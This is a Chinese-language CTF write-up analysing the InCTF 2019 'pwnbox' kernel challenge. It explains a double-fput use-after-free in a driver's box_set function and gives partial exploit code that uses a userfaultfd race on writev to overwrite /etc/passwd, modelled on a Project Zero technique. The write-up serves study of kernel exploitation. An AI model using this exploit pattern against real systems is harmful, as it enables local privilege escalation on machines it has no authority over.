
# [原创]2019-10-25-InCTF-Internationals-2019-pwnbox分析

## 环境配置

对`rootfs.img`解包修改

```
mkdir core
mv rootfs.img ./core/rootfs.cpio.gz
cd core
gunzip rootfs.cpio.gz
cpio -idmv < rootfs.cpio
rm -rf rootfs.cpio
vim init
```

修改`setsid cttyhack setuidgid 0 /bin/sh`获得 root 权限，来获取`/proc/kallsyms`的信息

重新打包脚本：

```
#!/bin/sh
find . | cpio -o --format=newc > ../rootfs.img
```

调试时通过`cat /sys/module/core/sections/.text`获取驱动加载的基地址

本题获取命令如下：

```
/ # grep 0 /sys/module/mod/sections/.text
0xffffffffc0000000
```

在 gdb 调试时，`add-symbol-file core.ko addr`对基地址进行加载可调试

从`bzImage`中提取`vmlinux`，提取脚本如下：

<mark class="encrypted">fefK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6@1L8%4u0$3j5h3I4V1M7#2)9J5c8X3I4A6L8Y4g2^5i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8Y4y4U0M7X3W2H3N6s2y4Q4x3V1k6W2P5s2c8J5j5h3y4@1i4K6u0V1N6X3#2D9K9h3&6#2P5l9`.`.</mark>

`./extract-vmlinux ./bzImage > vmlinux`

## 基本知识点

### dup2函数

```
dup2(oldfd, newfd)等效于
close(oldfd);
fcntl(oldfd, F_DUPFD, newfd);
F_DUPFD
与dup函数功能一样，复制由fd指向的文件描述符，调用成功后返回新的文件描述符，与旧的文件描述符共同指向同一个文件。
例：
fd = dup2(oldfd, fileno(stdout));
fd等于fileno(stdout)，指向oldfd对应的文件，此时终端输出的内容会重定向保存到oldfd指向的文件中。
```

`fcntl`系统调用可以用来对已打开的文件描述符进行各种控制操作以改变已打开文件的的各种属性

头文件为：

```
#include<unistd.h>
#include<fcntl.h>
int fcntl(int fd, int cmd);
int fcntl(int fd, int cmd, long arg);
int fcntl(int fd, int cmd ,struct flock* lock);
```

### kcmp系统调用

![](upload/attach/201911/589842_A5TBWJSEJJDASGS.jpg)

`kcmp`检查两个进程的对应的文件描述符`idx1`和`idx2`是否指向同一个文件，相同返回0。

参考链接：<mark class="encrypted">7e6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3P5Y4S2U0x3X3#2S2L8W2)9J5c8Y4m8Q4x3V1j5%4y4U0b7&6x3U0b7H3i4K6u0W2K9s2c8E0L8l9`.`.</mark>

### `MAP_PRIVATE` | `MAP_ANONYMOUS` 映射

通过`mmap`指定私有匿名映射，不会立即分配这块内存，在实际访问这块内存才会通过`userfaultfd`进行分配操作

## 题目分析

`fget()`函数会调用`fget_unlocked()`，获取`struct file`的文件描述符`fd`，并对引用计数`f_count`加1。

`file`结构定义(`sys/sys/file.h`)：

```
170 struct file {
171 void *f_data; /* file descriptor specific data */
172 struct fileops *f_ops; /* File operations */
173 struct ucred *f_cred; /* associated credentials. */
174 struct vnode *f_vnode; /* NULL or applicable vnode */
175 short f_type; /* descriptor type */
176 short f_vnread_flags; /* (f) Sleep lock for f_offset */
177 volatile u_int f_flag; /* see fcntl.h */
178 volatile u_int f_count; /* reference count */
179 /*
180  * DTYPE_VNODE specific fields.
181  */
182 int f_seqcount; /* (a) Count of sequential accesses. */
183 off_t f_nextoff; /* next expected read/write offset. */
184 union {
185 struct cdev_privdata *fvn_cdevpriv;
186 /* (d) Private data for the cdev. */
187 struct fadvise_info *fvn_advice;
188 } f_vnun;
189 /*
190  * DFLAG_SEEKABLE specific fields
191  */
192 off_t f_offset;
193 /*
194  * Mandatory Access control information.
195  */
196 void *f_label; /* Place-holder for MAC label. */
197 };
```

漏洞点在于`box_set`函数：

```
static int box_set(struct file *file, char *attr) {
...
if (file->private_data) {
encfile = fget((unsigned int)(unsigned long)file->private_data);
f = check_encfile(encfile);
if (!IS_ERR(f))
fput(f);
fput(encfile); [2] <--
}
...
}
struct file *check_encfile(struct file *encfile) {
if (!encfile)
return ERR_PTR(-EBADF);
if (encfile->f_op != &encBox_fops) {
fput(encfile); [1] <--
return ERR_PTR(-EINVAL);
}
return encfile;
}
```

关闭设备的大体流程

`sys_close()->filp_close()->fput()->__fput()->release()`，所以调用`fput`函数会调用到`__fput()`函数，减少对文件的引用计数

在执行[2]前调用了`check_encfile`，如果`encfile->f_op != &encBox_fops`条件成立，将会调用`fput`函数，所以一共调用了两次`fput`，引用计数`f_count`减少2，导致`uaf`漏洞。要满足该判断条件，只需要文件块不是由`box_create`分配出来的就行。

## Exp分析

利用方式借鉴于 Project Zero 的<mark class="encrypted">599K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1N6h3N6K6i4K6u0W2j5$3S2J5L8$3#2A6N6h3#2Q4x3X3g2G2M7X3N6Q4x3V1k6H3i4K6u0r3M7s2u0G2K9X3g2U0N6q4)9J5k6s2A6W2M7X3!0Q4x3V1k6A6M7%4y4#2k6i4y4Q4x3V1k6V1k6i4c8S2K9h3I4Q4x3@1k6A6k6q4)9K6c8o6R3H3z5l9`.`.</mark>

(CVE-2016-4557)

```
int main(){
mod_fd = open("/dev/mod", O_RDWR);
if(mod_fd == -1) errExit("open(/dev/mod)");
//mod_fd = 3
int box = box_new(mod_fd,0x1337); //box = 4
printf("[*] box_new : %x \n",box);
set_box(mod_fd,box);// <-- [0]
close(box);
uaf_fd = open("/home/user/ll", O_RDWR | O_CREAT);// uaf_fd = 4
printf("uaf_fd : %x \n",uaf_fd);
struct iovec * iov = (struct iovec *) init_userfaltfd();
ssize_t writev_res = writev(uaf_fd,iov, 1);
printf("[*] writev return : %lx\n",writev_res);
}
```

[1]处调用`set_box`函数，由于`fd_3`是由`box_new`申请得到，所以`encfile->f_op = &encBox_fops`，不进行`fput`操作。

`iov = init_userfaltfd()`函数返回的是`MAP_ANONYMOUS`属性的页地址，访问时会触发缺页错误。

通过`ssize_t writev(int fd, const struct iovec *iov, int iovcnt);`函数将`iov`地址上的内容写入`uaf_fd`对应的文件中。

函数调用链如下：`writev->do_writev->vfs_writev->do_readv_writev`

在`vfs_writev`函数中对文件的可写权限进行了判断，此时`uaf_fd`对应`/home/user/ll`文件，可通过判断。(正常`/etc/passwd`普通用户是不可写的)

```
ssize_t vfs_writev(struct file *file, const struct iovec __user *vec,
unsigned long vlen, loff_t *pos, int flags)
{
if (!(file->f_mode & FMODE_WRITE))
return -EBADF;
if (!(file->f_mode & FMODE_CAN_WRITE))
return -EINVAL;
return do_readv_writev(WRITE, file, vec, vlen, pos, flags);
}
```

在判断可写权限和执行写操作之间的窗口就是我们的条件竞争窗口。我们可以通过`userfaultfd`来对该竞争窗口进行攻击，达到暂停执行写操作的效果，延长攻击窗口。

在调用`do_readv_writev`时，会先将调用`import_iovec`函数从用户层复制`iovec`结构，之后再进行写操作。因为访问了用户层内存，所以触发了缺页错误，进入`userfaltfd`处理流程，在流程中执行`pwn()`函数触发漏洞，将`uaf_fd`指向`/etc/passwd`文件，并且通过`ioctl(uffd, UFFDIO_COPY, &uffdio_copy)`操作给`iov`地址上写入`payload`。

```
/**
 * import_iovec() - Copy an array of &struct iovec from userspace
 * into the kernel, check that it is valid, and initialize a new
 * &struct iov_iter iterator to access it.
 */
static ssize_t do_readv_writev()
{
...
ret = import_iovec(type, uvector, nr_segs,
ARRAY_SIZE(iovstack), &iov, &iter);
...
}
```

最后执行写操作，将`iov`上的内容写入`/etc/passwd`。

触发`double-fput`,形成`UAF`漏洞的过程如下：

```
void pwn(){
int uaf_dup;
printf("[*] pwning ...\n");
int box = box_new(mod_fd,0x1337); //box = 6, 5分配给了 uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
printf("[*] new_box : %x \n",box);
// trigger uaf
printf("[*] trigger uaf\n");
set_box(mod_fd,box); // <-- [1]
uaf_dup = dup2(uaf_fd,box); // uaf_fd = 4, uaf_dup=6,此时同时指向fd_4的文件
box = box_new(mod_fd,0x1337); //box = 7
// trigger uaf
set_box(mod_fd,box);// <-- [2]
close(uaf_dup);
```

[1]处`file->private_data`为[0]处赋值的4，对`fd_4`文件描述符进行操作，引用计数先增1，后触发漏洞连续减去两次，此时`fd_4`的文件引用计数为1。通过`dup2`函数使得`fd_6`也指向`fd_4`文件，引用计数此时为2。[2]处调用`set_box`，触发漏洞，先增1，变成3后，又连续两次减去1，变成1。最后利用`close`函数令引用计数清零，此时文件块属于释放状态，但`uaf_fd`仍指向该文件块。

在`exp`中插桩输出调试信息：

```
static int box_set(struct file *file, char *attr) {
int fd;
struct file *f;
struct file *encfile;
PRINTK("[%d] before f_count: %d \n",count , file->f_count);
PRINTK("set box:\n",count);
if (copy_from_user(&fd, (char *)attr, sizeof(int)))
return -EFAULT;
PRINTK("fd: %d \n", fd);
encfile = fget(fd);
PRINTK("[%d] before encfile->f_count: %d \n",count , encfile->f_count);
f = check_encfile(encfile);
PRINTK("[%d] before1 encfile->f_count: %d \n",count , encfile->f_count);
if (IS_ERR(f))
return -EBADF;
if (file->private_data) {
PRINTK("[%d] file->private_data: %d \n",count, file->private_data);
encfile = fget((unsigned int)(unsigned long)file->private_data);
PRINTK("[%d] after encfile->f_count: %d \n",count , encfile->f_count);
f = check_encfile(encfile);
PRINTK("[%d] after1 encfile->f_count: %d \n",count , encfile->f_count);
if (!IS_ERR(f))
fput(f);
fput(encfile);
PRINTK("[%d] after2 encfile->f_count: %d \n",count, encfile->f_count);
}
count ++;
file->private_data = (void *)(unsigned long)fd;
return 0;
}
```

调试信息如下：
